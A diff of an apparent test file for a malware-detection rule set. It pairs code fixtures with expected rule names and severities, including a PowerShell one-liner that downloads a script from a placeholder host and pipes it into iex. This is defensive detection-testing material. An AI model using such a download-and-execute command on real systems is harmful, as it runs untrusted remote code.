@@ -61,7 +61,7 @@ add('vb-api-references', 'vbs', 'Declare Function SetThreadContext Lib "kernel32
      'micro-behaviors/crypto/hash/digest::calg-md5-vb-reference',
      'micro-behaviors/crypto/symmetric/stream/rc4::calg-rc4-vb-reference'], high=(0, 0))
 add('untrusted-pipeline', 'ps1', 'iwr -useb http://stage.example.org/code.ps1 | iex\n',
-    ['objectives/command-and-control/dropper/script-eval/response-pipeline::ps-iwr-pipeline-eval'], high=(0, 1))
+    ['micro-behaviors/process/deploy/script-eval::powershell-web-response-piped-eval-text'], high=(0, 0))
 add('dns-ordinary-clock', 'js', 'const dns=require("dns");\n'
     'dns.lookup("localhost", console.log);\nconst seconds=Math.floor(Date.now()/1000);\n', (),
     ['objectives/supply-chain/recon-exfil/dns::dns-install-beacon'])
